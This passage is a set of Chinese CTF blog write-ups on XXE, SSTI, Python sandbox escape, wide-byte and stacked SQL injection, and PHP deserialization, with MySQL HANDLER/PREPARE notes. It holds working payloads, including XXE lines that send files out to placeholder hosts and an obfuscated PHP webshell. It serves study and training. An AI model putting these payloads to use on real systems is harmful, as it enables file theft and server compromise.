123456789101112&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt; &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt; &lt;!ENTITY % ISOamso &#x27; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;http://myip/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;send; &#x27;&gt; %remote;]&gt;&lt;message&gt;1234&lt;/message&gt; OOB 12345678910111213&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE r [&lt;!ELEMENT r ANY &gt;&lt;!ENTITY % sp SYSTEM &quot;http://x.x.x.x:443/ev.xml&quot;&gt;%sp;%param1;%exfil;]&gt;## External dtd: ##&lt;!ENTITY % data SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini&quot;&gt;&lt;!ENTITY % param1 &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://x.x.x.x:443/?%data;&#x27;&gt;&quot;&gt; 基于报错的Bind XXE 基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。 请求外部服务器方式 a.xml : 123456789&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [&lt;!ENTITY % remote SYSTEM &quot;file:///var/www/html/XML/a.dtd&quot;&gt;&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/XML/file&quot;&gt;%remote;%start;%send;]&gt;&lt;message&gt;1234&lt;/message&gt; a.dtd : 1&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;file:///hhhhhhh/%file;&#x27;&gt;&quot;&gt; 执行php 1234$ echo &quot;YXNkCjw+Cjw/Cg==&quot; | base64 -d asd&lt;&gt;&lt;? 请求本地dtd文件方式 ubuntu系统自带/usr/share/yelp/dtd/docbookx.dtd 123456789101112&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt; &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt; &lt;!ENTITY % ISOamso &#x27; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;send; &#x27;&gt; %remote;]&gt;&lt;message&gt;1234&lt;/message&gt; SSRF 通过回显时间、回显长度判断端口是否开放 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE note [&lt;!ENTITY xxe SYSTEM &quot;http://10.211.55.5:80&quot;&gt;]&gt;&lt;note&gt; &lt;info&gt;&amp;xxe;&lt;/info&gt;&lt;/note&gt; 命令执行= php的expect:// 协议可以用来执行命令 为了使用 expect:// 封装器，必须安装 » PECL 上的 » Expect 扩展 关于XXE漏洞挖掘 XML作为介质传输流程应该是这样的： 用户传输敏感数据-&gt;xml形式传输-&gt;后端解析xml(loadXML)-&gt;将各DOM节点转化为SimpleXML节点(最终为数组形式，节点名为键名，节点值为键值)-&gt;提取对应节点键值-&gt;数据提取/用户判断 漏洞点就在后端解析xml。 当后端使用**loadXML()**的方法解析xml文档时，会解析恶意xml语句即外部实体的引用，从而造成漏洞。 在挖掘漏洞的时候尤其注意两点： content-type: application/xml xml形式的数据传输e.g:&lt;user&gt;admin&lt;/user&gt; 关于防御 对于PHP，禁止引用外部实体 1libxml_disable_entity_loader(true); 对于其它语言，其实做好过滤就行了。 相关CTF题目 网鼎杯2020 filejava DozerCTF2020 svgggggg！ GoogleCTF2019 Bnv https://www.freebuf.com/vuls/207639.html 在今年的Google CTF 中出了一道Blind XXE 题 bnv，这道题完整WP可以参考这里，这里只分析Blind XXE部分。 这题目可以从错误响应中泄露信息。因为题目无法和外界通信，通过引入本地DTD文件，payload并不复杂，就和上面分析的一样 123456789101112&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ELEMENT message ANY&gt; &lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt; &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt; &lt;!ENTITY % ISOamso &#x27; &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt; &amp;#x25;para2; &#x27;&gt; %remote;]&gt;&lt;message&gt;10&lt;/message&gt; 如果不引用外部DTD文件，直接通过嵌套参数实体，这道题同样可以做出来。 1234567891011&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ELEMENT message ANY&gt; &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt; &lt;!ENTITY % para &#x27; &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt; &amp;#x25;para2; &#x27;&gt; %para;]&gt;&lt;message&gt;10&lt;/message XXE payload xxe实验踩坑记录 合天网安 https://xz.aliyun.com/t/3357 https://blog.csdn.net/lileiyuyanqin/article/details/72828922 https://www.cnblogs.com/backlion/p/9302528.html https://www.freebuf.com/column/156863.html https://www.freebuf.com/column/208904.html https://www.freebuf.com/articles/web/126788.html https://www.freebuf.com/vuls/194112.html https://www.cnblogs.com/r00tuser/p/7255939.html https://www.freebuf.com/column/188849.html https://www.jianshu.com/p/d73b0ee9eeae https://zhuanlan.zhihu.com/p/389550468 XPath漏洞利用 一篇文章带你深入理解漏洞之 XXE 漏洞 https://xz.aliyun.com/t/8041"},{"title":"mysql-handler","date":"2020-02-24","updated":"2024-03-19","path":"2020/02/24/mysql-handler/","text":"mysql查询语句-handler Mysql HANDLER语句 HANDLER语法 12345678910HANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125; [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ &#123; FIRST | NEXT &#125; [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE 通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。 通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。 通过HANDLER tbl_name CLOSE来关闭打开的句柄。 通过索引去查看的话可以按照一定的顺序，获取表中的数据。 通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。 通过索引列指定一个值，可以指定从哪一行开始。 通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。 如果我们不想浏览一个表的所有行，可以使用where和limit子句。 HANDLE语句提供了直接访问存储引擎的接口。对于innodb和myism表都是可用的。 实例分析 创建测试表及测试数据 12345678910create table handler_table( c1 int, c2 varchar(10), c3 int(10) ); insert into handler_table values(2, &#x27;name2&#x27;, 002); insert into handler_table values(5, &#x27;name5&#x27;, 005); insert into handler_table values(1, &#x27;name1&#x27;, 001); insert into handler_table values(4, &#x27;name4&#x27;, 004); insert into handler_table values(3, &#x27;name3&#x27;, 003); 不通过索引打开查看表 打开句柄： 1mysql&gt; handler handler_table open; ​ 查看表数据： 1234567891011121314151617181920212223242526272829303132mysql&gt; handler handler_table read first;+------+-------+------+| c1 | c2 | c3 |+------+-------+------+| 2 | name2 | 2 |+------+-------+------+mysql&gt; handler handler_table read next;+------+-------+------+| c1 | c2 | c3 |+------+-------+------+| 5 | name5 | 5 |+------+-------+------+mysql&gt; handler handler_table read next;+------+-------+------+| c1 | c2 | c3 |+------+-------+------+| 1 | name1 | 1 |+------+-------+------+mysql&gt; handler handler_table read next;+------+-------+------+| c1 | c2 | c3 |+------+-------+------+| 4 | name4 | 4 |+------+-------+------+mysql&gt; handler handler_table read next;+------+-------+------+| c1 | c2 | c3 |+------+-------+------+| 3 | name3 | 3 |+------+-------+------+mysql&gt; handler handler_table read next;Empty set (0.00 sec) 关闭句柄： 12mysql&gt; handler handler_table close;Query OK, 0 rows affected (0.00 sec) 通过索引打开查看表（FIRST,NEXT,PREV,LAST） ​ 通过索引查看的话，可以按照索引的升序，从小到大，查看表信息。 创建索引： 1mysql&gt; create index handler_index on handler_table(c1); ​ 打开句柄： 1mysql&gt; handler handler_table open as p; ​ 查看表数据： 123456789101112131415161718192021222324252627282930313233343536373839404142mysql&gt; handler p read handler_index first;+------+-------+------+| c1 | c2 | c3 |+------+-------+------+| 1 | name1 | 1 |+------+-------+------+mysql&gt; handler p read handler_index next;+------+-------+------+| c1 | c2 | c3 |+------+-------+------+| 2 | name2 | 2 |+------+-------+------+mysql&gt; handler p read handler_index next;+------+-------+------+| c1 | c2 | c3 |+------+-------+------+| 3 | name3 | 3 |+------+-------+------+mysql&gt; handler p read handler_index next;+------+-------+------+| c1 | c2 | c3 |+------+-------+------+| 4 | name4 | 4 |+------+-------+------+mysql&gt; handler p read handler_index next;+------+-------+------+| c1 | c2 | c3 |+------+-------+------+| 5 | name5 | 5 |+------+-------+------+mysql&gt; handler p read handler_index prev;+------+-------+------+| c1 | c2 | c3 |+------+-------+------+| 4 | name4 | 4 |+------+-------+------+mysql&gt; handler p read handler_index last;+------+-------+------+| c1 | c2 | c3 |+------+-------+------+| 5 | name5 | 5 |+------+-------+------+ 关闭句柄： 1mysql&gt; handler p close; 通过索引打开查看表（=,&lt;=,&gt;=,&lt;,&gt;） ​ 从index为2的地方开始 ​ 打开句柄： 1mysql&gt; handler handler_table open as p; ​ 查看表数据： 123456789101112131415161718192021222324252627282930mysql&gt; handler p read handler_index = (2);+------+-------+------+| c1 | c2 | c3 |+------+-------+------+| 2 | name2 | 2 |+------+-------+------+mysql&gt; handler p read handler_index next; +------+-------+------+| c1 | c2 | c3 |+------+-------+------+| 3 | name3 | 3 |+------+-------+------+mysql&gt; handler p read handler_index next;+------+-------+------+| c1 | c2 | c3 |+------+-------+------+| 4 | name4 | 4 |+------+-------+------+mysql&gt; handler p read handler_index next;+------+-------+------+| c1 | c2 | c3 |+------+-------+------+| 5 | name5 | 5 |+------+-------+------+mysql&gt; handler p read handler_index last;+------+-------+------+| c1 | c2 | c3 |+------+-------+------+| 5 | name5 | 5 |+------+-------+------+ ​ 关闭句柄： 1mysql&gt; handler p close; 附加：语法实例参考 1234567891011121314151617181920212223handler handler_table open;handler handler_table open as p;handler handler_table read first;handler handler_table read next;handler handler_table read first limit 3;handler handler_table read next limit 3,3;handler handler_table read first where c1 &gt; 2 limit 2;handler handler_table read next where c1 &gt;2 limit 1,2;create index handler_index on handler_table(c1);handler handler_table open;handler handler_table read handler_index first;handler handler_table read handler_index next limit 3;handler handler_table read handler_index PREV limit 3,3;handler handler_table read handler_index LAST where c1 &gt; 2 limit 2;handler handler_table read handler_index LAST where c1 &gt; 2 limit 1,2;handler handler_table read handler_index = (3);handler handler_table read handler_index &lt;= (3) limit 2;handler handler_table read handler_index &gt;= (3) limit 1,2;handler handler_table read handler_index &lt; (4) where c1 &gt; 0 limit 2;handler handler_table read handler_index &gt; (1) where c1 &lt; 6 limit 2,2;handler handler_table close;drop index handler_index on handler_table; handler与select的比较 4.1 select语句一次返回所有相关行，handler每次返回一行。 4.2 HANDLER涉及的分析较少，比SELECT更快 4.3 没有优化程序或查询校验开销 4.4 在两个管理程序请求之间，不需要锁定表。 注意事项 5.1 如果一个应用停止了，所有仍然打开的句柄将自动停止。 5.2 handler不支持分区表。 5.3 执行TRUNCATE TABLE会关闭所有在该表上打开的handler。 5.4 handler打开一个表时不锁表，也不对表进行快照，所以当表中数据实时更新时，handler将会失去指针的位置。"},{"title":"mysql预处理语句prepare","date":"2020-02-24","updated":"2024-03-19","path":"2020/02/24/mysql预处理语句prepare/","text":"concat()字符串连接 CONCAT()函数用于将多个字符串连接成一个字符串 CONCAT(str1,str2,…) 返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。或许有一个或多个参数。 如果所有参数均为非二进制字符串，则结果为非二进制字符串。 如果自变量中含有任一二进制字符串，则结果为一个二进制字符串。一个数字参数被转化为与之相等的二进制字符串格式；若要避免这种情况，可使用显式类型 cast。SELECT CONCAT(CAST(int_col AS CHAR), char_col) 123456MariaDB [test]&gt; select concat(&quot;AB&quot;,&quot;C&quot;);+------------------+| concat(&quot;AB&quot;,&quot;C&quot;) |+------------------+| ABC |+------------------+ CONCAT_WS(separator,str1,str2,…) CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。 第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。如果分隔符为 NULL，则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。 123456MariaDB [test]&gt; select concat_ws(&quot;,&quot;,&quot;AB&quot;,&quot;C&quot;);+-------------------------+| concat_ws(&quot;,&quot;,&quot;AB&quot;,&quot;C&quot;) |+-------------------------+| AB,C |+-------------------------+ prepare()预处理 PREPARE：准备一条SQL语句，并分配给这条SQL语句一个名字供之后调用 EXECUTE ：执行命令 DEALLOCATE PREPARE：释放命令 在 SQL 语句中，我们使用了问号 (?)，在此我们可以将问号替换为整型，字符串，双精度浮点型和布尔值 12345678910111213141516171819202122232425MariaDB [test]&gt; PREPARE pr1 FROM &#x27;SELECT ?+?&#x27;;Query OK, 0 rows affected (0.000 sec)Statement preparedMariaDB [test]&gt; SET @a=1, @b=2;Query OK, 0 rows affected (0.000 sec)MariaDB [test]&gt; EXECUTE pr1 USING @a,@b;+------+| ?+? |+------+| 3 |+------+1 row in set (0.000 sec)MariaDB [test]&gt; EXECUTE pr1 USING 2,3;+------+| ?+? |+------+| 5 |+------+1 row in set (0.000 sec)MariaDB [test]&gt; DEALLOCATE PREPARE pr1;Query OK, 0 rows affected (0.000 sec) 1234567891011121314151617181920212223242526272829303132333435363738mysql&gt; CREATE TABLE a (a int); Query OK, 0 rows affected (0.26 sec) mysql&gt; INSERT INTO a SELECT 1; Query OK, 1 row affected (0.04 sec) Records: 1 Duplicates: 0 Warnings: 0 mysql&gt; INSERT INTO a SELECT 2; Query OK, 1 row affected (0.04 sec) Records: 1 Duplicates: 0 Warnings: 0 mysql&gt; INSERT INTO a SELECT 3; Query OK, 1 row affected (0.04 sec) Records: 1 Duplicates: 0 Warnings: 0 mysql&gt; SET @select_test = CONCAT(&#x27;SELECT * FROM &#x27;, @table_name); Query OK, 0 rows affected (0.00 sec) mysql&gt; SET @table_name = &#x27;a&#x27;; Query OK, 0 rows affected (0.00 sec) mysql&gt; PREPARE pr2 FROM @select_test; Query OK, 0 rows affected (0.00 sec) Statement prepared mysql&gt; EXECUTE pr2 ; +------+ | a | +------+ | 1 | | 2 | | 3 | +------+ 3 rows in set (0.00 sec) mysql&gt; DROP PREPARE pr2; -- 此处DROP可以替代DEALLOCATE Query OK, 0 rows affected (0.00 sec)"},{"title":"python沙箱逃逸","date":"2020-02-23","updated":"2024-03-19","path":"2020/02/23/python沙箱逃逸/","text":"https://www.jianshu.com/p/a77c50dfebcb 12345678910111213#!/usr/bin/env python# encoding: utf-8cnt=0for item in [].__class__.__base__.__subclasses__(): try: if &#x27;os&#x27; in item.__init__.__globals__: print cnt,item cnt+=1 except: print &quot;error&quot;,cnt,item cnt+=1 continue 寻找的思路，我以python2中的第一条为例来说明，大家可以看到，无论是[].__class__.__base__.__subclasses__()还是&quot;&quot;.__class__.__mro__[-1].__subclasses__()还是样例中的其他写法，都表示(python2)或是的子类，所以这就是我们sandbox bypass的核心， 首先通过这份代码： 12345678910111213#!/usr/bin/env python# encoding: utf-8cnt=0for item in [].__class__.__base__.__subclasses__(): try: if &#x27;os&#x27; in item.__init__.__globals__: print cnt,item cnt+=1 except: print &quot;error&quot;,cnt,item cnt+=1 continue 我们找到 12345678......71 &lt;class &#x27;site._Printer&#x27;&gt;......76 &lt;class &#x27;site.Quitter&#x27;&gt;...... 这两个模块是引入过’os’模块的，所以我们就可以用： [].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'] [].__class__.__base__.__subclasses__()[76].__init__.__globals__['os'] 轻松引入os模块了。 再以Python2的第三条和第四条为例，我用如下代码寻找的： 12345678910111213141516#!/usr/bin/env python# encoding: utf-8cnt=0for item in &quot;&quot;.__class__.__mro__[-1].__subclasses__(): try: cnt2=0 for i in item.__init__.__globals__: if &#x27;eval&#x27; in item.__init__.__globals__[i]: print cnt,item,cnt2,i cnt2+=1 cnt+=1 except: print &quot;error&quot;,cnt,item cnt+=1 continue 所以其实寻找方式其实大同小异，只要巧妙的运用魔术方法来寻找关键函数和关键模块就行了，当然其中的变通啊bypass啊也需要根据实际环境去解决，这里就不再过多赘述。 哦，还要多提一下jinja2，因为使用的频率相当高，所以jinja2下的给一个poc： 1request.__class__.__mro__[8].__subclasses__()[40] 另外关于jinja2下的一些其他姿势，我就不强行搬运了，主要看看这个Jinja2 template injection filter bypasses 当然最好是看jinja的文档中的内置过滤器清单一栏 思路则主要是利用内置过滤器来控制输入来bypass黑名单过滤。 SSTI 提到了这里还是说说实际和ssti相关的东西，以flask为例，如果是直接return render_template('home.html', url=request.args.get('p'))就基本不存在ssti了，render_template_string存在ssti,而django中的如果使用return render(request,'xxx.html',var)也基本是安全的。 Flask CTF shrine题目 url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config 3. If I can use ( and ) 1&#123;&#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__[&#x27;os&#x27;].__dict__.environ[&#x27;FLAG]&#125;&#125; method 1.Discover current_app in url_for 1&#123;&#123;url_for&#125;&#125; ↓ 1&lt;function url_for at 0x7f5cc8cd1f28&gt; 1&#123;&#123;url_for.__globals__&#125;&#125; method 2.Discover current_app in get_flashed_messages 1&#123;&#123;get_flashed_messages&#125;&#125; ↓ `` 1&#123;&#123;get_flashed_messages.__globals__&#125;&#125; exploit 1GET /shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125; or 1GET /shrine/&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125; ↓ CTF CISCN-2018-Final 格式化字符串+SESSION伪造+软连接读文件 代码中class User(db.Model,SQLAlchemy)继承了SQLAlchemy类，SQLAlchemy类中有请求上下文current_app变量，通过测试可以获取。 注册POC: &#123;user.__class__.__mro__[3].__init__.__globals__[current_app].config&#125;，登陆后访问个人中心，拿到secret_key。 Smi1e http://bendawang.site/2018/03/01/关于Python-sec的一些总结/"},{"title":"php_PDO_prepare安全性","date":"2020-02-22","updated":"2024-03-19","path":"2020/02/22/php-PDO-prepare安全性/","text":"Are PDO prepared statements sufficient to prevent SQL injection? addslashes() Versus mysql_real_escape_string() SQL injection that gets around mysql_real_escape_string() GBK内码查询 宽字节注入 上文中提到了这种类型的攻击对于任何字符编码都是可能的，只要这个编码集中有一个以0x5c结尾的有效多字节字符,并且0x27是单字节字符': 例如gbk中0xbf5c是一个有效的多字节字符,而0x27是一个有效的单字符'，而utf-8不符合这样的要求。符合要求的编码集有:big5, cp932, gb2312, gbk and sjis. 使用addslashes()导致的单引号逃逸 在gbk中0xbf5c是一个有效的多字节编码,而0xbf27则被当作两个单字节字符对待。 我的payload为0xbf27，其中的0x27为单引号'，如果调用了addslashes()则会对这个单引号进行转义(也就是单引号前面加上反斜杠\\)，反斜杠的编码为0x5c。则我的payload变成了0xbf5c27，然后前四位0xbf5c被gbk认为是一个有效的双字节编码字符，0x27为'。最终结果就成了一个有效字符加上一个单引号，单引号逃逸成功！ PDO中prepare()导致的单引号逃逸 The important thing to realize here is that PDO by default does NOT do true prepared statements. It emulates them (for MySQL). Therefore, PDO internally builds the query string, calling mysql_real_escape_string() (the MySQL C API function) on each bound string value. PDO在默认情况下不执行真正的预处理语句。它模拟它们。因此，PDO在内部构建查询字符串，在每个绑定字符串值上调用mysql_real_escape_string() (mysql C API函数)。 C API调用mysql_real_escape_string() 不同于addslashes()，因为它知道连接使用的字符集。然而，到目前为止，客户端认为我们仍然在为连接使用latin1，因为我们从来没有告诉它不是这样的。我们确实告诉服务器我们正在使用gbk，但是客户端仍然认为它是latin1。 构造思路就是用一种编码传递例如0xbf27。 sql使用gbk字符时，一个gbk编码的汉字占两个字节。比如：%df\\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则会认为 %df%5c 是一个宽字符，也就是縗’，也就是说：%df\\’ = %df%5c%27=縗’。"},{"title":"安洵杯2019","date":"2020-02-21","updated":"2024-03-19","path":"2020/02/21/安洵杯2019/","text":"官方 easy_serialize_php 考点 变量覆盖 预包含 反序列化中的对象逃逸 题解 首先打开网页界面，看到source_code，点击就可以直接看到源码。 从上往下阅读代码，很明显的可以发现一个变量覆盖。至于这个覆盖怎么用，暂时还不知道，这是第一个考点。 往下看，可以看到我们可以令function为phpinfo来查看phpinfo，此时就可以看到我的第二个考点： 我在php.ini中设置了auto_prepend_file隐式包含了d0g3_f1ag.php，直接访问可以发现没有任何内容，说明我们需要读取这个文件的内容。 接着往下看代码，可以看到最终执行了一个file_get_contents，从这个函数逆推回去$userinfo[“img”]的值，可以发现这个值虽然是我们可控的，但是会经过sha1加密，而我没有解密，导致无法读取任何文件。 此时需要把注意力转移到另外一个函数serialize上，这里有一个很明显的漏洞点，数据经过序列化了之后又经过了一层过滤函数，而这层过滤函数会干扰序列化后的数据。 PS：任何具有一定结构的数据，如果经过了某些处理而把结构体本身的结构给打乱了，则有可能会产生漏洞。 payload1(值逃逸)： 123_SESSION[user]= flagflagflagflagflagflag&amp;_SESSION[function]= a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&amp;function= show_image 这里我令_SESSION[user]为flagflagflagflagflagflag，正常情况下序列化后的数据是这样的： 12345a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:28:&quot;L3VwbG9hZC9ndWVzdF9pbWcuanBn&quot;;&#125; 而经过了过滤函数之后，序列化的数据就会变成这样： 12345a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:28:&quot;L3VwbG9hZC9ndWVzdF9pbWcuanBn&quot;;&#125; 可以看到，user的内容长度依旧为24，但是已经没有内容了，所以反序列化时会自动往后读取24位： 123456a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;; --&gt; len(&#x27;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&#x27;)=24s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;; --&gt; 到这个 &#125; 号，正好是三个键，于是反序列化结束，后面的字符都被当做非法字符忽略s:3:&quot;img&quot;;s:28:&quot;L3VwbG9hZC9ndWVzdF9pbWcuanBn&quot;;&#125; 会读取到上图的位置，然后结束，由于user的序列化内容读取数据时需要往后填充24位，把function这个键当成了user的值覆盖了，导致后面function的内容也发生了改变，吞掉了其双引号，导致我们可以控制后面的序列化内容 而php反序列化时，当一整段内容反序列化结束后，后面的非法字符将会被忽略，而如何判断是否结束呢，可以看到，前面有一个a:3，表示序列化的内容是一个数组，有三个键，而以&#123;作为序列化内容的起点，&#125;作为序列化内容的终点。 所以此时后面的&quot;;s:3:&quot;img&quot;;s:28:&quot;L3VwbG9hZC9ndWVzdF9pbWcuanBn&quot;;&#125;在反序列化时就会被当作非法字符忽略掉，导致我们可以控制$userinfo[&quot;img&quot;]的值，达到任意文件读取的效果。 payload2(键逃逸): 这儿只需要一个键值对就行了，我们直接构造会被过滤的键，这样值得一部分充当键，剩下得一部分作为单独得键值对 var_dump的结果为： 1_SESSION[flagphp]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; var_dump的结果为： 1&quot;a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mbGxsbGxsYWc=&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot; 这儿得s:7:&quot;&quot;之所以为空，是因为我们构造得键flagphp都是会被过滤得，所以显示为空，这样就能吃掉一部分值了，然后将剩下得值充当另一个对象逃逸出去~~ 在读取完d0g3_f1ag.php后，得到下一个hint，获取到flag文件名，此时修改payload读根目录下的flag即可。"},{"title":"ichunqiu2020","date":"2020-02-21","updated":"2024-03-19","path":"2020/02/21/ichunqiu2020/","text":"打了一天的球大晚上的才想起来。。十点就结束了 Web ezupload 文件上传，编辑一个一句话木马evil.php(中国蚁剑可以生成) 1234567&lt;?php$wBZS=create_function(base64_decode(&#x27;JA==&#x27;).chr(01110-0725).base64_decode(&#x27;bw==&#x27;).base64_decode(&#x27;bQ==&#x27;).str_rot13(&#x27;r&#x27;),str_rot13(&#x27;r&#x27;).str_rot13(&#x27;i&#x27;).base64_decode(&#x27;YQ==&#x27;).base64_decode(&#x27;bA==&#x27;).chr(0657-0607).chr(0362-0316).str_rot13(&#x27;f&#x27;).chr(933-822).chr(981-872).str_rot13(&#x27;r&#x27;).base64_decode(&#x27;KQ==&#x27;).base64_decode(&#x27;Ow==&#x27;));$wBZS(base64_decode(&#x27;ODE1O&#x27;.&#x27;DQ2O0&#x27;.&#x27;BldkF&#x27;.&#x27;sKCRf&#x27;.&#x27;&#x27;.chr(46410/546).str_rot13(&#x27;R&#x27;).chr(01625-01534).base64_decode(&#x27;VA==&#x27;).base64_decode(&#x27;Vg==&#x27;).&#x27;&#x27;.&#x27;&#x27;.str_rot13(&#x27;S&#x27;).base64_decode(&#x27;dA==&#x27;).str_rot13(&#x27;w&#x27;).chr(813-715).chr(73863/849).&#x27;&#x27;.&#x27;RdKTs&#x27;.&#x27;yNDQ3&#x27;.&#x27;NTM4O&#x27;.&#x27;w==&#x27;.&#x27;&#x27;));echo(&quot;\\n--------&quot;);?&gt;asdzxc 上传后显示文件地址 然后中国蚁剑链接，密码cmd。根目录下有flag，和readflag，直接点flag是没有结果的，查看权限(0711)就知道了，readflag的权限是(4755)，应该就是通过执行readflag来读取他本地的flag，然后进入蚁剑的虚拟终端(Orz…)，进入根目录然后执行readflag，ok blacklist 堆叠注入 类似强网杯的随便注 通过这个过滤函数看出来，堆叠注入没办法使用预处理语句，所以堆叠注入最多只能注入出表名，列明，数据库名。 12345678910111213141516171819202122232425262728293031321&#x27;;show databases;array(1) &#123; [0]=&gt; string(9) &quot;supersqli&quot;&#125;1&#x27;;use supersqli;show tables;array(1) &#123; [0]=&gt; string(8) &quot;FlagHere&quot;&#125;array(1) &#123; [0]=&gt; string(5) &quot;words&quot;&#125;1&#x27;;use supersqli;show tables;describe FlagHere;array(6) &#123; [0]=&gt; string(4) &quot;flag&quot; [1]=&gt; string(12) &quot;varchar(100)&quot; [2]=&gt; string(2) &quot;NO&quot; [3]=&gt; string(0) &quot;&quot; [4]=&gt; NULL [5]=&gt; string(0) &quot;&quot;&#125; 利用 mysql Handler MySQL的DECLARE…HANDLER使用 HANDLER语法 12345678910HANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125; [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ &#123; FIRST | NEXT &#125; [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE 通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。 通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。 通过HANDLER tbl_name CLOSE来关闭打开的句柄。 payload: 11&#x27;;handler FlagHere open;handler FlagHere read first;handler FlagHere close; 1234array(1) &#123; [0]=&gt; string(42) &quot;flag&#123;89743041-eb8d-43c5-b965-fdb51afacc2d&#125;&quot;&#125; easysqli_copy 宽字节注入 盲注 堆叠注入 宽字节注入原理 sql使用gbk字符时，一个gbk编码的汉字占两个字节。比如：%df\\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则会认为 